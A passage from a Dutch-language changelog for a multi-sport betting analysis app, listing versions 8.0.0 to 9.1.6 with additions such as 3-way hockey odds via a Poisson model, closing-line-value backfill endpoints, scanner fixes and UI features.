- `GET /api/debug/odds?sport=hockey&team=...` — dumpt raw bookmaker data + markeert 3-way markten.

### Fixed
- Modal stake gebruikt nu `userSettings.unitEur` ipv hardcoded 10 (0.3 × 25 = €7.50 klopt).

## [9.1.6] - 2026-04-14

### Added
- **3-way ML (60-min regulation)** voor hockey + handbal via Poisson goal model.
- `poisson3Way(expHome, expAway)` helper — bivariate Poisson voor P(home>away), P(tie), P(away>home).
- `parseGameOdds` herkent 3-way markten (3 values Home/Draw/Away) als aparte `threeWay` array.
- Settlement logica voor 60-min markten (gebruikt `regScoreH`/`regScoreA`, niet inclusief OT).
- `fetchCurrentOdds` ondersteunt 3-way markets voor CLV tracking.

### Changed
- `detectMarket` keyt `home60`/`draw60`/`away60` apart zodat 60-min picks niet mengen met inc-OT in calibratie.

## [9.1.5] - 2026-04-14

### Fixed
- Hockey 2-way ML: `homeOddsOT`/`awayOddsOT` pre-filter voor 60-min-only bookies (Unibet, Toto, BetCity, Ladbrokes). Ons model is inc-OT; hun ML settlet op 60-min → edge werd overschat.

## [9.1.0 - 9.1.4] - 2026-04-14

### Added
- Sport-bucket fix in calibration: non-football scans geven sport mee aan mkP.
- `normalizeSport()` mapping Voetbal/IJshockey/Honkbal → canonical slug.
- Inbox "Per Sport" card met win rate per sport.
- Scan-tijden accepteren HH:MM formaat ipv hele uren. Default 07:30.
- CLV backfill knop in Mijn Bets UI.
- CLV backfill diagnostics + probe endpoint (`GET /api/clv/backfill/probe`).
- CLV strict bookie match: geen fallback naar Bet365 als jouw bookie niet beschikbaar.

## [9.0.3] - 2026-04-14

### Fixed
- Analyzer vindt nu niet-gescande wedstrijden: threshold versoepeld (100 → 70) en beide teams fuzzy ≥40.
- Analyzer zoekt gisteren/vandaag/morgen (Amsterdam-tz) voor nachtwedstrijden.

### Added
- Analyzer multi-sport support: herkent hints (`nhl`, `nba`, `mlb`, `nfl`, `handbal`, …) en valt zonder hint terug op football + max 3 andere sporten (budget-bewaking).
- `POST /api/clv/backfill` (admin-only): vult `clv_odds` + `clv_pct` achteraf voor bets waar de scheduled check faalde. Rate-limited op 200ms/bet. Schrijft notificatie per succesvolle backfill.

### Docs
- README.md herschreven voor v9.0 (multi-sport, Supabase, CLV backfill).
- CHANGELOG.md toegevoegd.

## [9.0.2] - 2026-04-14

### Fixed
- Pre-match en CLV checks werken nu ook voor nachtwedstrijden: `findGameId` zoekt gisteren/vandaag/morgen (Amsterdam-tz).
- `fixture_id` wordt opgeslagen bij bet-creatie zodat checks na server-herstart betrouwbaar zijn.
- Mijn Bets sorteert chronologisch (19:00 vandaag vóór 01:00 morgen).

### Added
- Automatische CLV retry 5 min later als eerste poging faalt.
- Falende pre-match/CLV checks krijgen een notificatie in de inbox.

## [9.0.1] - 2026-04-14

### Fixed
- CLV fuzzy match: Egyptische clubs, accented namen en prefix-afwijkingen matchen nu correct.
- Analyzer rejectt live wedstrijden (geen pre-match analyse mogelijk).

### Added
- Scan history admin-view (alle users zichtbaar).
- Unit-size logging in Telegram-picks.
- NET Units kolom in tracker.

## [9.0.0] - 2026-04-13

### Added
- Extra markten per sport: NRFI/YRFI (baseball), 1st Half/1st Period Over-Under en Spread, Odd/Even totaal.
- Sport-dropdown in bet-modal + editable in tracker + Handball optie.
- Multi-sport scanner stuurt nu één Telegram-bericht ipv één per sport.

### Fixed
- Bankroll berekent alleen settled bets (open bets tellen niet mee).
- Variance-bug: expected wins werd foutief afgerond.
- CLV display: 0% werd als leeg getoond (gefilterd).
- API usage per sport wordt persistent opgeslagen in Supabase.

## [8.6.0] - 2026-04-13

### Added
- Alle features (pre-match, CLV, calibratie, signal tuning) werken nu voor 6 sporten.

## [8.5.0] - 2026-04-13

### Added
- API usage per sport zichtbaar in status-pagina.
- Dagwinst-widget op dashboard.
- Light theme.

### Fixed
- Odds-drift detectie false positives.

## [8.4.0] - 2026-04-13

### Added
- Sport-iconen in lijsten.
- Bankroll-projectie met open bets meegenomen.

### Fixed
- 6 diverse bugfixes (modal units, scanner top-5 cap, BTTS Nee/Ja, draw/DNB).

## [8.3.0] - 2026-04-13

### Added
- Alle sport-scanners kijken tot morgenochtend 10:00 voor nachtwedstrijden.
- 82 tests (endpoints, calibratie, signals, security).
- Dynamische seizoenen: nooit meer handmatig updaten.

### Fixed
- Hockey + handbal seizoen-formaat (integer ipv split-string).

## [8.2.0] - 2026-04-12

### Added
- Advanced stats per sport (PPG, rebounds, xG, streaks, home dominance).
- Data confidence-score weegt signalen op basis van databronnen.
- Research-based signal-gewichten.

## [8.1.0] - 2026-04-12

### Added
- Baseball + NFL + Handball scanners.
- api-football Pro → api-sports All Sports migratie (6 sporten).

## [8.0.0] - 2026-04-11

### Added
- Multi-sport: NBA + NHL scanners.
- Business plan update (All Sports plan).

---

Oudere versies (v3.x–v7.x): zie git history.
